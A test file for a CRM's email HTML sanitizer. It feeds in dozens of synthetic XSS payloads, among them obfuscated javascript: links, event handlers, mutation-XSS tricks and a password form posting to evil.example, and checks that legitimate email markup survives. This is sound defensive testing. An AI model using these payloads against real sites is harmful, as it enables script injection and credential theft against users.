import { describe, it, expect } from "vitest";
import { sanitizeCampaignHtml as clean } from "../sanitize-campaign-html";

// Campaign HTML is typed or pasted by a CRM user and is rendered in the signed-in CRM preview and mailed to every subscriber. These tests pin the
// allow-list sanitizer: hostile payloads lose everything executable, and the HTML that real email authors write survives intact. All payloads are
// synthetic strings; nothing here is sent, fetched or stored.

const NO_ACTIVE = /<script|<iframe|<object|<embed|<form|<input|<button|<svg|<math|<meta|<link|<base|<style|\son\w+\s*=|javascript:|vbscript:|expression\(|@import/i;

describe("hostile payloads are neutralised", () => {
  const payloads: Array<[string, string]> = [
    ["script tag", `<p>hi</p><script>alert(1)</script>`],
    ["script with attributes and mixed case", `<ScRiPt src="https://evil.example/x.js" async></sCrIpT>`],
    ["inline event handler on img", `<img src="https://example.com/a.png" onerror="alert(1)">`],
    ["event handler on any element", `<p onclick="steal()" onmouseover="steal()">x</p>`],
    ["javascript: link", `<a href="javascript:alert(document.cookie)">click</a>`],
    ["javascript: link with entity obfuscation", `<a href="jav&#x61;script:alert(1)">x</a>`],
    ["javascript: link with zero-padded numeric reference", `<a href="&#0000106avascript:alert(1)">x</a>`],
    ["javascript: link with tab/newline inside", `<a href="java\tscript:alert(1)">x</a><a href="java\nscript:alert(1)">y</a>`],
    ["javascript: with leading whitespace/control chars", `<a href="  \u0001javascript:alert(1)">x</a>`],
    ["vbscript: link", `<a href="vbscript:msgbox(1)">x</a>`],
    ["data:text/html link", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`],
    ["data:text/html in img", `<img src="data:text/html,<script>alert(1)</script>">`],
    ["svg data image (can carry script)", `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`],
    ["svg element with onload", `<svg onload="alert(1)"><circle r="5"/></svg>`],
    ["math element", `<math><mi xlink:href="javascript:alert(1)">x</mi></math>`],
    ["iframe", `<iframe src="https://evil.example"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe>`],
    ["object and embed", `<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">`],
    ["form posting elsewhere", `<form action="https://evil.example/collect" method="post"><input name="password"><button>Sign in</button></form>`],
    ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example">`],
    ["base href hijack", `<base href="https://evil.example/"><a href="/x">x</a>`],
    ["link stylesheet", `<link rel="stylesheet" href="https://evil.example/x.css">`],
    ["style block with @import and expression", `<style>@import url(https://evil.example/x.css); p{width:expression(alert(1))}</style><p>x</p>`],
    ["style attribute with expression()", `<p style="width:expression(alert(1))">x</p>`],
    ["style attribute with url() (tracking / javascript)", `<p style="background:url(javascript:alert(1))">x</p><p style="background-image:url(https://evil.example/t.gif)">y</p>`],
    ["style attribute with behavior / -moz-binding", `<p style="behavior:url(x.htc);-moz-binding:url(x.xml#a)">x</p>`],
    ["style attribute with @import / escape", `<p style="color:red;@import 'x'">x</p><p style="color:\\72 ed">y</p>`],
    ["position fixed overlay", `<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999">phish</div>`],
    ["noscript / template tricks", `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript><template><img src=x onerror=alert(1)></template>`],
    ["mutation XSS: nested noscript/style", `<style><img src="</style><img src=x onerror=alert(1)>">`],
    ["broken markup / unclosed tags", `<img src="x" onerror="alert(1)" <p>text<a href="javascript:alert(1)"`],
    ["attribute without quotes", `<img src=x onerror=alert(1)>`],
    ["slash separated attributes", `<img/src=x/onerror=alert(1)>`],
    ["uppercase scheme", `<a href="JAVASCRIPT:alert(1)">x</a>`],
    ["protocol-relative URL", `<a href="//evil.example/x">x</a><img src="//evil.example/t.gif">`],
    ["srcset with javascript", `<img src="https://example.com/a.png" srcset="javascript:alert(1) 1x">`],
    ["target=_blank without rel", `<a href="https://example.com" target="_blank">x</a>`],
    ["xlink / formaction / action attributes", `<a xlink:href="javascript:alert(1)">x</a><button formaction="javascript:alert(1)">x</button>`],
    ["id/class clobbering and name attributes", `<img name="getElementById" id="x" src="https://example.com/a.png"><p id="__proto__" class="admin">x</p>`],
    ["html comments and conditional comments", `<!--[if IE]><script>alert(1)</script><![endif]--><!-- <script>alert(2)</script> --><p>x</p>`],
    ["cdata and processing instructions", `<![CDATA[<script>alert(1)</script>]]><?php echo 1; ?><p>x</p>`],
    ["null bytes", `<scr\u0000ipt>alert(1)</scr\u0000ipt><a href="java\u0000script:alert(1)">x</a>`],
    ["entity-encoded tags (text, not markup)", `&lt;script&gt;alert(1)&lt;/script&gt;`],
  ];

  for (const [label, payload] of payloads) {
    it(`${label}: nothing executable or fetchable survives`, () => {
      const out = clean(payload);
      expect(out, `${label} -> ${out}`).not.toMatch(NO_ACTIVE);
      // (Leftover text such as "alert(1)" between tags, or inside a quoted src value, is inert: what matters is that no element or attribute that can
      // run or fetch code remains, which is what NO_ACTIVE checks - and that no attribute is an event handler, checked next.)
      expect([...out.matchAll(/<[a-z][^>]*>/gi)].map((m) => m[0]).join(" "), label).not.toMatch(/\son[a-z]+\s*=|\ssrcdoc\s*=|\sformaction\s*=|\sxlink:/i);
      // Output re-parsed by the same sanitizer is unchanged: it holds nothing the allow-list would still object to.
      expect(clean(out), `${label} (idempotent)`).toBe(out);
    });
  }

  it("a link's dangerous target is dropped but its visible text is kept", () => {
    expect(clean(`<a href="javascript:alert(1)">Read more</a>`)).toBe("<a>Read more</a>");
  });

  it("target=_blank always gets rel=noopener noreferrer; an unknown target is removed", () => {
    expect(clean(`<a href="https://example.com" target="_blank">x</a>`)).toBe(`<a href="https://example.com" target="_blank" rel="noopener noreferrer">x</a>`);
    expect(clean(`<a href="https://example.com" target="_top">x</a>`)).toBe(`<a href="https://example.com">x</a>`);
  });

  it("script and style CONTENT never leaks out as visible text", () => {
    const out = clean(`<p>before</p><script>secretScriptBody()</script><style>.x{color:red}</style><title>pageTitleText</title><p>after</p>`);
    expect(out).toBe("<p>before</p><p>after</p>");
  });

  it("pathological input does not hang or throw: deep nesting, huge attribute, empty and non-string-ish values", () => {
    const deep = "<div>".repeat(2000) + "x" + "</div>".repeat(2000);
    expect(() => clean(deep)).not.toThrow();
    expect(clean("x".repeat(200_000)).length).toBe(200_000);
    expect(clean("")).toBe("");
    expect(clean(`<p style="${"a".repeat(100_000)}">x</p>`)).not.toMatch(/aaaa/);
  });
});

describe("legitimate email HTML is preserved", () => {
  it("keeps paragraphs, headings, emphasis, lists, blockquotes and line breaks exactly", () => {
    const html = `<h1>Spring fares</h1><h2>Business class</h2><p>Fly <strong>lie-flat</strong> to <em>Tokyo</em> &amp; <u>beyond</u>.<br>Book now.</p><ul><li>One</li><li>Two</li></ul><ol start="3"><li>Three</li></ol><blockquote>Quote</blockquote><hr>`;
    expect(clean(html)).toBe(html.replace("<br>", "<br />").replace("<hr>", "<hr />"));
  });

  it("keeps http(s), mailto and tel links with their text, title and safe target", () => {
    const html = `<p><a href="https://www.example.com/offer?a=1&amp;b=2" title="Offer">Offer</a> <a href="mailto:sales@example.com">Mail</a> <a href="tel:+14155552671">Call</a> <a href="http://example.com">Plain</a></p>`;
    expect(clean(html)).toBe(html);
  });

  it("keeps images with http(s) sources, alt text and dimensions", () => {
    const html = `<p><img src="https://cdn.example.com/hero.jpg" alt="Hero" width="600" height="300"><img src="http://cdn.example.com/logo.png" alt="Logo"></p>`;
    expect(clean(html)).toBe(`<p><img src="https://cdn.example.com/hero.jpg" alt="Hero" width="600" height="300" /><img src="http://cdn.example.com/logo.png" alt="Logo" /></p>`);
  });

  it("keeps a small inline base64 PNG image, but not an SVG or HTML data URI", () => {
    const png = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGP4z8DwHwAFAAH/q842iQAAAABJRU5ErkJggg==";
    expect(clean(`<img src="${png}" alt="dot">`)).toContain(png);
    expect(clean(`<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="x">`)).toBe("");
    expect(clean(`<img src="data:text/html;base64,PGI+PC9iPg==" alt="x">`)).toBe("");
  });

  it("keeps a typical layout table with its presentational attributes and inline CSS", () => {
    const html =
      `<table width="100%" cellpadding="0" cellspacing="0" border="0" role="presentation" style="border-collapse:collapse;background-color:#f4f4f4">` +
      `<tbody><tr><td align="center" valign="top" bgcolor="#ffffff" colspan="2" style="padding:24px 16px;font-family:Arial, Helvetica, sans-serif;font-size:16px;line-height:24px;color:#333333">` +
      `<p style="margin:0 0 12px;text-align:center;font-weight:700;letter-spacing:0.5px">Hello</p></td></tr></tbody></table>`;
    const out = clean(html);
    for (const piece of ['width="100%"', 'cellpadding="0"', 'cellspacing="0"', 'role="presentation"', 'align="center"', 'valign="top"', 'bgcolor="#ffffff"', 'colspan="2"', "border-collapse:collapse", "background-color:#f4f4f4", "padding:24px 16px", "font-family:Arial, Helvetica, sans-serif", "font-size:16px", "line-height:24px", "color:#333333", "text-align:center", "font-weight:700", "letter-spacing:0.5px"]) {
      expect(out, piece).toContain(piece);
    }
    expect(out).not.toMatch(NO_ACTIVE);
  });

  it("keeps a call-to-action 'button' link built from inline CSS", () => {
    const html = `<p><a href="https://example.com/book" style="display:inline-block;padding:12px 24px;background-color:#0a2540;color:#ffffff;text-decoration:none;border-radius:6px">Request an itinerary</a></p>`;
    const out = clean(html);
    expect(out).toContain('href="https://example.com/book"');
    for (const piece of ["display:inline-block", "padding:12px 24px", "background-color:#0a2540", "color:#ffffff", "text-decoration:none", "border-radius:6px"]) expect(out, piece).toContain(piece);
  });

  it("keeps colour, size and font spans, sub/superscript and preformatted text", () => {
    const html = `<p>H<sub>2</sub>O x<sup>2</sup> <span style="color:#c00;font-size:18px">red</span> <small>fine print</small></p><pre>line 1\nline 2</pre>`;
    expect(clean(html)).toBe(html);
  });

  it("keeps non-Latin text, emoji and entities", () => {
    const html = `<p>こんにちは — 東京 ✈ 😀 &copy; 2027 &nbsp;&amp; more</p>`;
    // Entities are decoded to characters (&copy; -> ©, &nbsp; -> U+00A0) and only the markup-significant & stays escaped.
    expect(clean(html)).toBe("<p>こんにちは — 東京 ✈ 😀 © 2027  &amp; more</p>");
  });

  it("a whole pasted document keeps its body content and drops the page furniture", () => {
    const html = `<!doctype html><html><head><meta charset="utf-8"><title>Newsletter</title><style>body{margin:0}</style><link rel="stylesheet" href="x.css"></head><body style="margin:0"><p>Body text</p></body></html>`;
    const out = clean(html);
    expect(out).toContain("<p>Body text</p>");
    expect(out).not.toMatch(/Newsletter|<head|<html|<style|<link|<meta/i);
  });

  it("the starters the CRM ships keep their content after cleaning", async () => {
    const { CAMPAIGN_STARTERS } = await import("@/lib/campaign-starters");
    for (const s of CAMPAIGN_STARTERS) {
      const text = (h: string) => h.replace(/<[^>]*>/g, "").replace(/\s+/g, " ").trim();
      expect(text(clean(s.html)), s.id).toBe(text(s.html));
      expect(clean(s.html), s.id).not.toMatch(NO_ACTIVE);
    }
  });
});

describe("the sanitizer is the same everywhere it is used", () => {
  it("buildMarketingCampaignEmail removes a payload from the email a subscriber would receive, and keeps the legitimate parts", async () => {
    const { buildMarketingCampaignEmail } = await import("../templates");
    const { html } = buildMarketingCampaignEmail({
      subject: "Spring fares",
      htmlContent: `<p>Hello</p><script>alert(1)</script><img src="https://example.com/a.png" onerror="alert(2)" alt="a"><a href="javascript:alert(3)">bad</a><a href="https://example.com/ok">ok</a>`,
      unsubscribeUrl: "https://crm.example/unsubscribe?token=t",
      company: { name: "Acme Travel", brandColor: "#0a2540" } as never,
    });
    expect(html).not.toMatch(/<script|onerror|javascript:|alert\(/i);
    expect(html).toContain("Hello");
    expect(html).toContain('src="https://example.com/a.png"');
    expect(html).toContain('href="https://example.com/ok"');
    expect(html).toContain("Unsubscribe"); // the system footer is not part of the author's content and is untouched
  });
});
